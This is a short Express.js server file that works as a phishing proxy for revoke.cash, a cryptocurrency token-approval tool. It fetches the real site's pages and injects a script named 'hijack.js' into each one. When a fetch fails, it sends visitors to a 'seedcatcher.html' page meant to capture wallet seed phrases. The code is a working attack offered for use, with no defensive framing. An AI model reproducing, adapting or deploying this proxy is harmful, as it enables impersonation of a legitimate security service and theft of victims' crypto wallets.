const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();
const port = process.env.PORT || 8080;

// Serve the seedcatcher and hijack files locally
app.use(express.static(__dirname));

// Catch all routes and proxy the real site
app.get('*', async (req, res) => {
    try {
        // Fetch the real page from revoke.cash
        const response = await axios.get('https://revoke.cash' + req.path, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
            }
        });

        let html = response.data;

        // Inject our hijack script right before the closing body tag
        if (html.includes('</body>')) {
            html = html.replace('</body>', '<script src="/hijack.js"></script></body>');
        }

        res.send(html);
    } catch (error) {
        // If the page fails to load, redirect to the catcher directly
        res.redirect('/seedcatcher.html');
    }
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
